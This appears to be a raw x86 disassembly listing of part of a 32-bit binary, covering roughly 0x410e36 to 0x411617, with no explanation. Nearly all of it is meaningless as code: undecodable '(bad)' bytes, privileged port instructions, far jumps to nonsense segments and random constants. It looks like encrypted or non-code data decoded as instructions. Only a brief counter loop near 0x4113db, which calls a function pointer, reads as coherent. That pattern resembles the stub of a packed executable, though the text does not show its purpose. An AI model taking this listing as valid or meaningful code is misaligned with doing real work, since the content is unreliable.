  410e36:	jmp    0x35ef:0xe469ec70
  410e3d:	outs   dx,BYTE PTR ds:[esi]
  410e3e:	or     eax,0xb1efc929
  410e43:	sbb    al,0xa
  410e45:	popf   
  410e46:	cld    
  410e47:	call   0x1db0cfac
  410e4c:	or     BYTE PTR [esi],al
  410e4e:	mov    dh,0xc1
  410e50:	popf   
  410e51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e52:	jl     0x410ec5
  410e54:	fld    DWORD PTR ds:0xe3972c40
  410e5a:	sub    al,0xfe
  410e5c:	sub    eax,DWORD PTR [edi]
  410e5e:	mov    al,ds:0x50c1d9fc
  410e63:	out    dx,al
  410e64:	sub    BYTE PTR [ebx+0x498661e8],dh
  410e6a:	jl     0x410e0e
  410e6c:	adc    esp,edx
  410e6e:	dec    esp
  410e6f:	sahf   
  410e70:	call   0xdc6933be
  410e75:	loope  0x410eab
  410e77:	jns    0x410e1f
  410e79:	retf   0x8e1e
  410e7c:	add    DWORD PTR [ebx],edx
  410e7e:	retf   
  410e7f:	mov    cl,0xca
  410e81:	cmp    bl,dh
  410e83:	jbe    0x410e17
  410e85:	pop    eax
  410e86:	int    0xa3
  410e88:	add    bl,cl
  410e8a:	repz cli 
  410e8c:	out    0xa2,al
  410e8e:	div    eax
  410e90:	xor    BYTE PTR [eax-0x2c],0x1c
  410e94:	sbb    DWORD PTR [esi-0x1c26c612],edx
  410e9a:	popf   
  410e9b:	inc    eax
  410e9d:	jbe    0x410e73
  410e9f:	outs   dx,DWORD PTR ds:[esi]
  410ea0:	aad    0xe7
  410ea2:	ins    BYTE PTR es:[edi],dx
  410ea3:	loope  0x410f1b
  410ea5:	clc    
  410ea6:	push   esi
  410ea7:	rcl    DWORD PTR [ebx+0x79bfc3fa],0x63
  410eae:	adc    dl,bl
  410eb0:	cdq    
  410eb1:	stos   DWORD PTR es:[edi],eax
  410eb2:	retw   0x756e
  410eb6:	std    
  410eb7:	mov    bl,BYTE PTR [esi]
  410eb9:	xchg   esp,eax
  410eba:	dec    edx
  410ebb:	jge    0x410ec3
  410ebd:	pop    ss
  410ebe:	fldcw  WORD PTR [ecx]
  410ec0:	fdivr  DWORD PTR [eax]
  410ec2:	test   eax,0x1ab56b04
  410ec7:	dec    eax
  410ec8:	pop    es
  410ec9:	cmp    al,al
  410ecb:	pop    ebx
  410ecc:	inc    edi
  410ecd:	stos   BYTE PTR es:[edi],al
  410ece:	or     ebx,edx
  410ed0:	sbb    eax,0x416ad0d9
  410ed5:	and    eax,0xc082e9d0
  410eda:	les    esp,FWORD PTR [edi+ecx*2+0x39]
  410ede:	out    dx,al
  410edf:	or     BYTE PTR [ebx],dh
  410ee1:	jno    0x410f58
  410ee3:	mov    cl,0x23
  410ee5:	mov    esp,0x89de9871
  410eea:	(bad)  
  410eeb:	hlt    
  410eec:	(bad)  
  410eed:	xchg   edx,eax
  410eee:	outs   dx,BYTE PTR ds:[esi]
  410eef:	scas   al,BYTE PTR es:[edi]
  410ef0:	push   esi
  410ef1:	jg     0x410eec
  410ef3:	cdq    
  410ef4:	mov    eax,0x7bafc853
  410ef9:	aad    0x4c
  410efb:	mov    al,ds:0x5ac1e68b
  410f00:	mov    cl,0xbf
  410f02:	mov    ?,WORD PTR [esi-0x18]
  410f05:	in     eax,0x1f
  410f07:	lock pushf 
  410f09:	cmp    ebx,DWORD PTR [esi]
  410f0b:	arpl   WORD PTR ds:0x64f63afe,bp
  410f11:	cmp    DWORD PTR [eax-0x7b],ebp
  410f14:	jnp    0x410f17
  410f16:	push   ecx
  410f17:	inc    eax
  410f18:	lea    esi,[ebx]
  410f1a:	std    
  410f1b:	out    dx,al
  410f1c:	add    al,0xe8
  410f1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f1f:	push   es
  410f20:	data16 mov ah,ah
  410f23:	mov    DWORD PTR [eax],0x6448acd1
  410f29:	aas    
  410f2a:	fmul   QWORD PTR [eax]
  410f2c:	stos   DWORD PTR es:[edi],eax
  410f2d:	or     eax,0x42173fa8
  410f32:	or     eax,0x330e69b2
  410f37:	or     al,0xf4
  410f39:	mov    ds:0x74e2a5b0,eax
  410f3e:	mov    ah,0x91
  410f40:	add    ch,0x66
  410f43:	xchg   ebx,eax
  410f44:	cmp    esp,DWORD PTR [eax-0x8]
  410f47:	jp     0x410f6d
  410f49:	adc    eax,0xbfdb1935
  410f4e:	inc    edi
  410f4f:	inc    esi
  410f50:	outs   dx,DWORD PTR ds:[esi]
  410f51:	xor    DWORD PTR [ebx-0x7396ae83],0x7eb3b34f
  410f5b:	out    0x68,eax
  410f5d:	mov    WORD PTR [ecx+0x76],ss
  410f60:	rcl    ecx,1
  410f62:	dec    ecx
  410f63:	cmp    DWORD PTR [eax-0x74eb43fe],edi
  410f69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f6a:	outs   dx,DWORD PTR ds:[esi]
  410f6b:	pop    ds
  410f6c:	xor    al,BYTE PTR [edx-0x18e1a32e]
  410f72:	out    dx,al
  410f73:	mov    ds:0x26a364f8,al
  410f78:	dec    edx
  410f79:	sbb    al,0x65
  410f7b:	pop    ss
  410f7c:	je     0x410f4d
  410f7e:	jmp    0x79351f67
  410f83:	push   ebp
  410f84:	imul   edi,DWORD PTR [edx+0x43b98783],0x965ea331
  410f8e:	test   DWORD PTR [ecx],ecx
  410f90:	jmp    0x410fe5
  410f92:	xor    al,0x6d
  410f94:	sahf   
  410f95:	mov    eax,0x2ca13f59
  410f9a:	mov    dl,0x41
  410f9c:	add    BYTE PTR [edx+0x32729c],bh
  410fa2:	sub    eax,edx
  410fa4:	adc    DWORD PTR ds:0x42fd6e,ebx
  410faa:	mov    ecx,0x7510855
  410faf:	push   esi
  410fb0:	mov    esi,DWORD PTR [ebp+0xc]
  410fb3:	xor    eax,ecx
  410fb5:	mov    DWORD PTR ds:0x42e11c,0x4b31
  410fbf:	jmp    0x4113c4
  410fc4:	xchg   edx,eax
  410fc5:	shl    DWORD PTR [edi+eiz*8+0x71516771],cl
  410fcc:	push   ebp
  410fcd:	paddsw mm6,QWORD PTR [eax-0x60a272b3]
  410fd4:	es dec esi
  410fd6:	jo     0x411048
  410fd8:	pop    eax
  410fd9:	jge    0x41104b
  410fdb:	jo     0x411009
  410fdd:	mov    ah,0x39
  410fdf:	fcmovbe st,st(1)
  410fe1:	adc    dl,BYTE PTR [ecx]
  410fe3:	push   eax
  410fe4:	jl     0x411006
  410fe6:	call   0x53e2:0xeaf03508
  410fed:	add    DWORD PTR [ecx+eiz*8-0x5a62c1ed],ecx
  410ff4:	mov    ds:0xa5a61e55,eax
  410ff9:	ins    BYTE PTR es:[edi],dx
  410ffa:	add    DWORD PTR [edi+0x57db841f],0x36be8aea
  411004:	es loopne 0x411045
  411007:	jmp    0x411019
  411009:	add    eax,0xcb867cda
  41100e:	inc    esi
  41100f:	adc    edi,DWORD PTR ds:0xb97e5197
  411015:	cmp    BYTE PTR [esi],0xa8
  411018:	sbb    bl,cl
  41101a:	push   ecx
  41101b:	inc    edx
  41101c:	cmc    
  41101d:	dec    edx
  41101e:	pop    eax
  41101f:	dec    ebx
  411020:	sbb    edi,DWORD PTR [ecx+0x64]
  411023:	jl     0x411050
  411025:	jp     0x41106f
  411027:	adc    DWORD PTR [esi+0x15],0xffffffc5
  41102b:	jb     0x411074
  41102d:	push   0x2d
  41102f:	and    al,0xa7
  411031:	(bad)  
  411032:	lahf   
  411033:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411034:	sahf   
  411035:	mov    esi,es
  411037:	das    
  411038:	stc    
  411039:	push   ecx
  41103a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41103b:	push   0xffffffb5
  41103d:	sub    al,0x75
  41103f:	mov    edx,0xc84973ba
  411044:	imul   eax,DWORD PTR [ecx],0x1b
  411047:	je     0x411014
  411049:	pusha  
  41104a:	ss icebp 
  41104c:	imul   DWORD PTR [edi-0x63]
  41104f:	inc    ecx
  411050:	push   eax
  411051:	dec    ecx
  411052:	xor    esp,ebp
  411054:	pop    edx
  411055:	mov    edi,DWORD PTR [ecx]
  411057:	xchg   esp,eax
  411058:	inc    ax
  41105a:	mov    ecx,0x5f0dd8f1
  41105f:	xor    eax,0xbdba17fb
  411064:	xchg   edx,eax
  411065:	stos   DWORD PTR es:[edi],eax
  411066:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411067:	stos   DWORD PTR es:[edi],eax
  411068:	or     ebx,DWORD PTR [edx-0x7b3c37f6]
  41106e:	(bad)  
  41106f:	mov    esi,0x62bee495
  411074:	and    DWORD PTR [ebx],ebx
  411076:	xor    bl,BYTE PTR [ebx-0x343d0840]
  41107c:	je     0x4110aa
  41107e:	js     0x41100e
  411080:	std    
  411081:	inc    edx
  411082:	and    al,0x9e
  411084:	out    dx,eax
  411085:	push   ebx
  411086:	call   0x737d18d6
  41108b:	xchg   al,al
  41108d:	inc    edx
  41108e:	xlat   BYTE PTR ds:[ebx]
  41108f:	mov    ebp,0x5c5608f0
  411094:	adc    BYTE PTR [eax-0x4f],ah
  411097:	aas    
  411098:	mov    bh,0x7
  41109a:	in     eax,0x37
  41109c:	pop    esp
  41109d:	mov    al,0x51
  41109f:	stos   DWORD PTR es:[edi],eax
  4110a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110a1:	and    bl,ch
  4110a3:	dec    esi
  4110a4:	pop    edx
  4110a5:	rcl    DWORD PTR ds:0x5363400b,cl
  4110ab:	mov    eax,0x8693c9db
  4110b0:	jle    0x411130
  4110b2:	and    bl,ch
  4110b4:	sub    BYTE PTR [esi+0x4be1024],al
  4110ba:	fsub   st(4),st
  4110bc:	out    0x52,eax
  4110be:	gs daa 
  4110c0:	xor    DWORD PTR ds:[eax+0x38],0x4c31843a
  4110c8:	int3   
  4110c9:	adc    eax,0xc6cb92f1
  4110ce:	dec    ebp
  4110cf:	ins    DWORD PTR es:[edi],dx
  4110d0:	dec    edx
  4110d1:	pop    ebx
  4110d2:	ret    0x9383
  4110d5:	mov    eax,ebp
  4110d7:	shr    BYTE PTR [eax+ebx*8-0x23],cl
  4110db:	rcr    BYTE PTR [ebx],0xb7
  4110de:	dec    esp
  4110df:	or     esi,DWORD PTR [ecx+edi*8-0x68f67dcb]
  4110e6:	imul   dl
  4110e8:	repnz dec ebp
  4110ea:	xlat   BYTE PTR ds:[ebx]
  4110eb:	xchg   BYTE PTR [ebp-0x43],ah
  4110ee:	jmp    0x411129
  4110f0:	adc    eax,0x5407d28b
  4110f5:	jb     0x411094
  4110f7:	mov    esi,0x8f8d17a2
  4110fc:	sub    al,0xb4
  4110fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110ff:	(bad)  
  411100:	fistp  WORD PTR [ecx-0x80]
  411103:	push   ds
  411104:	inc    esp
  411105:	jbe    0x41116b
  411107:	inc    edi
  411108:	fild   WORD PTR [bx+di-0x13]
  41110c:	mov    edx,0x4a9b3b3e
  411111:	int    0x9f
  411113:	int    0xe2
  411115:	call   0x9dfb:0x56ed0c6d
  41111c:	add    esi,DWORD PTR [ebx-0x74]
  41111f:	jno    0x411154
  411121:	mov    ebp,0x3afa4774
  411126:	jae    0x411161
  411128:	inc    edi
  411129:	enter  0x218b,0xdd
  41112d:	inc    edx
  41112e:	mov    esi,0x35d01807
  411133:	shl    dh,1
  411135:	jl     0x41119f
  411137:	mov    bl,0x34
  411139:	push   ss
  41113a:	imul   ebx,DWORD PTR [ebx+0x4bce47c9],0xffffffac
  411141:	stc    
  411142:	jecxz  0x411170
  411144:	add    al,0x7a
  411146:	test   al,0x6b
  411148:	div    DWORD PTR [eax]
  41114a:	push   ecx
  41114b:	sub    eax,0x72f9e4b9
  411150:	push   esi
  411151:	in     al,dx
  411152:	and    BYTE PTR [eax+0x3a],ch
  411155:	pop    esp
  411156:	das    
  411157:	sbb    bh,ah
  411159:	push   edx
  41115a:	(bad)  
  41115b:	addr16 addr16 int 0x81
  41115f:	xchg   ecx,eax
  411160:	and    al,0xc1
  411162:	lods   al,BYTE PTR ds:[esi]
  411163:	or     esi,DWORD PTR [edi]
  411165:	xchg   ebx,eax
  411166:	fsub   QWORD PTR [esi+0x5a]
  411169:	inc    edx
  41116a:	pop    ecx
  41116b:	bound  ebp,QWORD PTR [eax]
  41116d:	nop
  41116e:	dec    edx
  41116f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411170:	jle    0x411186
  411172:	pop    edx
  411173:	(bad)  
  411174:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411175:	pushf  
  411176:	std    
  411177:	xor    DWORD PTR [ecx-0x9],esi
  41117a:	cdq    
  41117b:	adc    eax,DWORD PTR [esi]
  41117d:	mov    al,0x4e
  41117f:	daa    
  411180:	and    bl,al
  411182:	stc    
  411183:	sbb    dl,dl
  411185:	std    
  411186:	stos   BYTE PTR es:[edi],al
  411187:	popf   
  411188:	pop    ebx
  411189:	xor    DWORD PTR [edi-0x17],eax
  41118c:	inc    eax
  41118d:	fs inc ecx
  41118f:	je     0x41113e
  411191:	or     esp,ebx
  411193:	dec    esi
  411194:	add    DWORD PTR ds:0xbf5c477f,edx
  41119a:	aam    0x44
  41119c:	or     BYTE PTR [eax-0x63],al
  41119f:	dec    ebx
  4111a0:	or     edx,DWORD PTR [ebx]
  4111a2:	(bad)  
  4111a3:	ret    0x9b4c
  4111a6:	xchg   ecx,eax
  4111a7:	dec    edx
  4111a8:	retf   0x42c3
  4111ab:	push   ecx
  4111ac:	das    
  4111ad:	mov    edx,0xe67996bd
  4111b2:	cld    
  4111b3:	add    eax,0x54aa0589
  4111b8:	pop    esi
  4111b9:	imul   eax,DWORD PTR [ecx-0x22992291],0x186cef2a
  4111c3:	or     eax,edx
  4111c5:	(bad)  
  4111c7:	cmp    BYTE PTR [ebp+0x6bc5192e],bl
  4111cd:	sbb    ebx,esi
  4111cf:	rcl    BYTE PTR [eax+edi*1+0x3e886d90],cl
  4111d6:	mov    dl,0x79
  4111d8:	or     BYTE PTR [eax],bl
  4111da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111db:	mov    dh,0x5a
  4111dd:	fdivr  QWORD PTR [edx]
  4111df:	ja     0x411232
  4111e1:	ret    
  4111e2:	lods   eax,DWORD PTR ds:[esi]
  4111e3:	outs   dx,DWORD PTR ds:[esi]
  4111e4:	dec    edx
  4111e5:	add    DWORD PTR [eax+edi*8-0x51f1b020],edi
  4111ec:	ins    DWORD PTR es:[edi],dx
  4111ed:	into   
  4111ee:	ror    BYTE PTR [eax-0x4c3284f0],0xf
  4111f5:	js     0x4111a3
  4111f7:	je     0x4111b5
  4111f9:	outs   dx,DWORD PTR ds:[esi]
  4111fa:	jne    0x41125a
  4111fc:	gs push ebp
  4111fe:	retf   
  4111ff:	inc    edi
  411200:	mov    ecx,0x1183e6a2
  411205:	call   0xf7df:0xcbce52ff
  41120c:	(bad)  
  41120d:	jmp    0xf041:0xdc11a8dc
  411214:	cld    
  411215:	xor    ebp,edi
  411217:	outs   dx,DWORD PTR ds:[esi]
  411218:	mov    esp,0xaa234be3
  41121d:	rol    BYTE PTR [edi+0x1048ec77],cl
  411223:	ins    DWORD PTR es:[edi],dx
  411224:	pop    esp
  411225:	pop    ebp
  411226:	push   ds
  411227:	mov    ebp,0xa415552a
  41122c:	cmp    BYTE PTR [edx+0x5a],bh
  41122f:	adc    al,0x37
  411231:	cld    
  411232:	data16 int3 
  411234:	and    DWORD PTR [esi-0x2],edi
  411237:	fs mov ah,0x53
  41123a:	scas   eax,DWORD PTR es:[edi]
  41123b:	popa   
  41123c:	ret    
  41123d:	xchg   cl,ah
  41123f:	in     al,dx
  411240:	stc    
  411241:	outs   dx,BYTE PTR ds:[esi]
  411242:	(bad)  
  411243:	in     al,0xfa
  411245:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411246:	repz sbb bh,BYTE PTR [ecx-0x69]
  41124a:	into   
  41124b:	and    DWORD PTR [esi],ecx
  41124d:	fidiv  WORD PTR [edi+edi*8]
  411250:	pop    ss
  411251:	out    0x2d,al
  411253:	into   
  411254:	stos   BYTE PTR es:[edi],al
  411255:	in     eax,dx
  411256:	sar    eax,cl
  411258:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41125a:	rep stos BYTE PTR es:[edi],al
  41125c:	jge    0x4112d9
  41125e:	jp     0x4112bf
  411260:	out    0x4a,al
  411262:	cld    
  411263:	dec    ecx
  411264:	iret   
  411265:	jnp    0x4111f2
  411267:	pop    edx
  411268:	popf   
  411269:	mov    edx,0x12b6e5d3
  41126e:	mov    al,0xdc
  411270:	(bad)  
  411271:	repnz rol BYTE PTR [edi+0x1d74da8f],cl
  411278:	out    0x47,eax
  41127a:	aam    0x87
  41127c:	loope  0x4112e0
  41127e:	in     al,dx
  41127f:	jno    0x41126e
  411281:	es xchg edx,eax
  411283:	or     DWORD PTR [ecx],ecx
  411285:	imul   ebp,DWORD PTR [ebp+0x14],0x450d8871
  41128c:	inc    ebx
  41128d:	les    ebx,FWORD PTR [esi-0x6c]
  411290:	adc    esp,esp
  411292:	ja     0x4112cc
  411294:	dec    ebp
  411295:	je     0x411255
  411297:	(bad)  
  411298:	xor    esp,DWORD PTR [esi+0x7c073516]
  41129e:	pop    ecx
  41129f:	sub    eax,0x49a68235
  4112a4:	adc    dl,BYTE PTR [ebx]
  4112a6:	add    al,0xe1
  4112a8:	lea    ebx,[eax]
  4112aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112ab:	fist   WORD PTR [edi+0x24]
  4112ae:	lds    eax,FWORD PTR [edi]
  4112b0:	(bad)  [eax+0x1d]
  4112b3:	(bad)  
  4112b4:	cmc    
  4112b5:	jno    0x4112b8
  4112b7:	dec    edi
  4112b8:	pop    ds
  4112b9:	das    
  4112ba:	add    dh,bh
  4112bc:	fwait
  4112bd:	and    eax,0x6d6fb4a9
  4112c2:	push   ecx
  4112c3:	mov    esp,0x331745d7
  4112c8:	shl    DWORD PTR [edi-0x3e87d727],0x9a
  4112cf:	add    eax,0xf2cfdc59
  4112d4:	shr    DWORD PTR [ecx-0xc48ea],0x65
  4112db:	sub    BYTE PTR [esi-0x77a54937],dl
  4112e1:	out    dx,eax
  4112e2:	leave  
  4112e3:	mov    al,ds:0x2d8df8c8
  4112e8:	dec    eax
  4112e9:	daa    
  4112ea:	mov    ebp,0x98cada6
  4112ef:	and    al,BYTE PTR [ebp+0x7ff0c255]
  4112f5:	cli    
  4112f6:	loopne 0x411317
  4112f8:	pop    edx
  4112f9:	and    al,0xa6
  4112fb:	in     eax,0x50
  4112fd:	jmp    0x411353
  4112ff:	lahf   
  411300:	dec    ecx
  411301:	enter  0xd16b,0x97
  411305:	push   edi
  411306:	sub    eax,0xa224908f
  41130b:	addr16 xchg esi,eax
  41130d:	lahf   
  41130e:	fldenv [ebp-0xd]
  411311:	call   0x2ab4a60
  411316:	dec    ebp
  411317:	jmp    0x411299
  411319:	or     eax,0x68249943
  41131e:	fbstp  TBYTE PTR [eax]
  411320:	xchg   BYTE PTR [ecx-0x60],bh
  411323:	call   0x4eb65121
  411328:	shr    BYTE PTR ds:0x1cb6caff,0x9e
  41132f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411330:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411331:	jle    0x4112b6
  411333:	arpl   WORD PTR [esp+ebx*1+0x57affef5],cx
  41133a:	sbb    edx,DWORD PTR [ebp+edi*1-0x25]
  41133e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41133f:	inc    eax
  411340:	call   DWORD PTR [ebp-0x5bc8973a]
  411346:	lock aas 
  411348:	jmp    0x411316
  41134a:	mov    ds:0x13bead10,eax
  41134f:	fnstenv cs:[esi+0x76]
  411353:	bound  esp,QWORD PTR gs:[ecx]
  411356:	loopne 0x4112f2
  411358:	or     al,0xb8
  41135a:	sbb    DWORD PTR [esi-0x74],ebx
  41135d:	xor    edi,edi
  41135f:	aam    0x91
  411361:	div    eax
  411363:	dec    edi
  411364:	inc    esp
  411365:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411366:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411367:	adc    ah,bh
  411369:	and    al,0xbc
  41136b:	xor    ch,dh
  41136d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41136e:	popf   
  41136f:	test   DWORD PTR [edi],0x33cce1ca
  411375:	mov    WORD PTR [ebx-0x7ff9cfac],ds
  41137b:	add    BYTE PTR [esi-0x19fc587b],al
  411381:	data16 fdivr DWORD PTR [esp+ebp*8+0x68]
  411386:	neg    BYTE PTR [edx+0x69]
  411389:	add    BYTE PTR [edx],cl
  41138b:	int    0x8e
  41138d:	sub    ecx,DWORD PTR [esi]
  41138f:	mov    ch,0x5d
  411391:	push   0x466c3aa2
  411396:	xor    edi,DWORD PTR [edx-0x70691dc6]
  41139c:	jl     0x411340
  41139e:	jp     0x41139d
  4113a0:	mov    dl,0x56
  4113a2:	jnp    0x411381
  4113a4:	add    al,0x6a
  4113a6:	dec    eax
  4113a7:	add    al,0xcf
  4113a9:	push   esi
  4113aa:	inc    esi
  4113ab:	mov    bh,0x7e
  4113ad:	mov    ds,WORD PTR [ecx-0x39d2f7c9]
  4113b3:	pop    ebp
  4113b4:	pop    edi
  4113b5:	icebp  
  4113b6:	shl    dl,cl
  4113b8:	mov    WORD PTR [eax-0x534358ff],ss
  4113be:	xor    BYTE PTR [ecx+0x68],cl
  4113c1:	or     ch,dl
  4113c3:	mov    al,ds:0x5c7c63b
  4113c8:	icebp  
  4113c9:	cld    
  4113ca:	inc    edx
  4113cb:	add    ah,ah
  4113cd:	js     0x4113cf
  4113cf:	add    BYTE PTR [edi],cl
  4113d1:	test   ah,al
  4113d3:	or     BYTE PTR [eax],al
  4113d5:	add    BYTE PTR [ecx+0x41b224],ah
  4113db:	and    DWORD PTR ds:0x42fd7a,0x0
  4113e5:	mov    esi,DWORD PTR ds:0x42fd7a
  4113eb:	inc    esi
  4113ec:	mov    DWORD PTR ds:0x42fd7a,esi
  4113f2:	cmp    DWORD PTR ds:0x42fd7a,0x8
  4113f9:	jne    0x41140f
  4113ff:	push   0x42e1e7
  411404:	push   0x42e26d
  411409:	call   DWORD PTR ds:0x42e567
  41140f:	cmp    DWORD PTR ds:0x42fd7a,0x7
  411416:	jne    0x411429
  41141c:	mov    esi,DWORD PTR ds:0x42fd7a
  411422:	inc    esi
  411423:	mov    DWORD PTR ds:0x42fd7a,esi
  411429:	cmp    DWORD PTR ds:0x42fd7a,0x13
  411430:	jb     0x4113e5
  411436:	jmp    0x41183b
  41143b:	and    cl,al
  41143d:	leave  
  41143e:	adc    ch,cl
  411440:	adc    ecx,esp
  411442:	call   0xcb53bead
  411447:	cmp    DWORD PTR [esi-0x2f],eax
  41144a:	out    dx,eax
  41144b:	push   cs
  41144c:	dec    edx
  41144d:	jo     0x4114bf
  41144f:	pop    eax
  411450:	jge    0x4114c2
  411452:	jo     0x4114b8
  411454:	pop    es
  411455:	mov    al,ds:0x8b5d2f42
  41145a:	mov    edx,0x2723364b
  41145f:	(bad)  
  411460:	fcom   QWORD PTR [ecx-0x32]
  411463:	add    eax,0xd1460c56
  411468:	inc    esp
  411469:	xchg   ebx,eax
  41146a:	pusha  
  41146b:	jmp    0xf68e:0x90bb1aa2
  411472:	xchg   DWORD PTR [ebp+0x2178f0f],ebx
  411478:	loopne 0x411437
  41147a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41147b:	jno    0x41149c
  41147d:	add    BYTE PTR [ecx],0x4d
  411480:	sub    ecx,DWORD PTR [edi-0x6a]
  411483:	inc    esp
  411484:	loop   0x411458
  411486:	cmp    al,BYTE PTR [edx-0x273bad39]
  41148c:	pop    ebx
  41148d:	and    eax,0xe89cad82
  411492:	(bad)  
  411493:	fnstcw WORD PTR [esp+esi*8-0x59]
  411497:	pop    esi
  411498:	xchg   ebx,eax
  411499:	je     0x411506
  41149b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41149c:	cs pop ds
  41149e:	ja     0x4114d7
  4114a0:	pop    edi
  4114a1:	xchg   esp,eax
  4114a2:	push   ss
  4114a3:	pop    ebx
  4114a4:	jo     0x41149e
  4114a6:	cli    
  4114a7:	push   ss
  4114a8:	xor    BYTE PTR [ebx],ah
  4114aa:	jae    0x411467
  4114ac:	fs push esp
  4114ae:	or     al,0x57
  4114b0:	and    eax,0x3e2a74a4
  4114b5:	outs   dx,DWORD PTR ds:[esi]
  4114b6:	push   eax
  4114b7:	xchg   edi,eax
  4114b8:	add    DWORD PTR [edi+0x4cf57cd],ebx
  4114be:	stc    
  4114bf:	and    BYTE PTR [ebp+0x55b7edf8],0xba
  4114c6:	xor    DWORD PTR [edx],ebp
  4114c8:	xchg   ebx,eax
  4114c9:	(bad)  
  4114ca:	retf   
  4114cb:	xor    ecx,DWORD PTR [ecx*4-0x193a4d4b]
  4114d2:	push   ds
  4114d3:	loop   0x4114ac
  4114d5:	fwait
  4114d6:	push   esi
  4114d7:	push   es
  4114d8:	outs   dx,BYTE PTR ds:[esi]
  4114d9:	sbb    DWORD PTR [eax+eiz*2+0x39],eax
  4114dd:	push   ecx
  4114de:	xor    dl,ah
  4114e0:	lods   eax,DWORD PTR ds:[esi]
  4114e1:	mov    ds:0x2f46066e,eax
  4114e6:	sbb    BYTE PTR [ecx],0xb4
  4114e9:	sub    al,0x35
  4114eb:	push   esp
  4114ec:	mov    BYTE PTR [ebx-0x26],bh
  4114ef:	push   esi
  4114f0:	call   0xb0db:0x782f1cf5
  4114f7:	data16 int3 
  4114f9:	or     esi,DWORD PTR [ebp-0x2f]
  4114fc:	loop   0x41150a
  4114fe:	ja     0x41154d
  411500:	rcl    DWORD PTR ds:0xa00ea3a1,0x73
  411507:	push   es
  411508:	push   esi
  411509:	lea    ecx,[edx-0x2cdcbf4f]
  41150f:	xchg   ebx,eax
  411510:	(bad)  
  411511:	repnz cmp ecx,ebp
  411514:	fisubr WORD PTR [ebx+0x28]
  411517:	repnz cdq 
  411519:	pusha  
  41151a:	jle    0x4114c2
  41151c:	mov    edx,0xca3dbd66
  411521:	je     0x41157c
  411523:	push   ebp
  411524:	int    0xf5
  411526:	pop    esi
  411527:	cmp    BYTE PTR [ebp+0x70795f0f],dh
  41152d:	nop
  41152e:	mov    esp,0xbca211a3
  411533:	add    DWORD PTR [ecx-0x7ebf2cfd],edi
  411539:	mov    esp,0x92a495e9
  41153e:	add    BYTE PTR [eiz*8-0x631e33ae],ch
  411545:	test   eax,0x87b4d955
  41154a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41154b:	(bad)  
  41154c:	mov    ds:0x9208f020,al
  411551:	scas   eax,DWORD PTR es:[edi]
  411552:	adc    BYTE PTR [esi-0x3d],ah
  411555:	xchg   esi,eax
  411556:	fwait
  411557:	sbb    bl,BYTE PTR [ebx-0x80]
  41155a:	xor    eax,0xe9afa6b5
  41155f:	push   ss
  411560:	cmp    eax,0xea6b8d67
  411565:	sbb    DWORD PTR [edi],edi
  411567:	out    dx,al
  411568:	and    BYTE PTR [ebp+eax*1-0x7f84fe42],al
  41156f:	add    eax,DWORD PTR [ebx]
  411571:	fsub   QWORD PTR [ebx+0x71]
  411574:	sub    DWORD PTR [ebp+0x403ca96f],0x65f74a0c
  41157e:	frstor [edi+0x39f99913]
  411584:	jbe    0x41158d
  411586:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411587:	pop    edi
  411588:	retf   0x4c
  41158b:	retf   
  41158c:	pop    ecx
  41158d:	mov    al,0x8c
  41158f:	scas   al,BYTE PTR es:[edi]
  411590:	data16 jnp 0x411579
  411593:	mov    eax,0xbe257d76
  411598:	cmp    ebx,ebx
  41159a:	pusha  
  41159b:	repz in al,dx
  41159d:	repz cdq 
  41159f:	mov    edi,0xf39e5a0b
  4115a4:	mov    ebx,DWORD PTR [edi-0x319eb84f]
  4115aa:	test   eax,0xa7bfa316
  4115af:	xchg   BYTE PTR ds:0xaf54453b,bh
  4115b5:	imul   eax,DWORD PTR [esi],0x1b330a58
  4115bb:	adc    al,0xdc
  4115bd:	xor    edi,ecx
  4115bf:	data16 jns 0x4115d4
  4115c2:	push   eax
  4115c3:	jecxz  0x4115f8
  4115c5:	mov    eax,ds:0x732bfbab
  4115ca:	ss cwde 
  4115cc:	rcl    BYTE PTR [ebx+0xaca17f0],cl
  4115d2:	cmp    esi,ebp
  4115d4:	fwait
  4115d5:	popf   
  4115d6:	xchg   ebp,eax
  4115d7:	and    ch,cl
  4115d9:	and    cl,dl
  4115db:	ins    DWORD PTR es:[edi],dx
  4115dc:	shr    BYTE PTR [esp+edi*8+0x3d],1
  4115e0:	dec    esp
  4115e1:	and    BYTE PTR [edx+0x52ee5449],cl
  4115e7:	mov    bh,0xb4
  4115e9:	push   ss
  4115ea:	inc    edi
  4115eb:	and    BYTE PTR [ecx],ah
  4115ed:	mov    ecx,0x988848fb
  4115f2:	fucomip st,st(5)
  4115f4:	fstp   TBYTE PTR [esi-0x5b4c7e66]
  4115fa:	cmc    
  4115fb:	mov    ebp,0x7ba8e9e5
  411600:	dec    ebp
  411601:	jno    0x411674
  411603:	popf   
  411604:	sub    eax,0x65c74254
  411609:	out    0x38,eax
  41160b:	(bad)  
  41160c:	in     eax,dx
  41160d:	sahf   
  41160e:	ins    DWORD PTR es:[edi],dx
  41160f:	test   al,0x17
  411611:	cmp    edi,edx
  411613:	xor    BYTE PTR [edx+0x53],0x42
  411617:	and    BYTE PTR [eax-0x73],ch
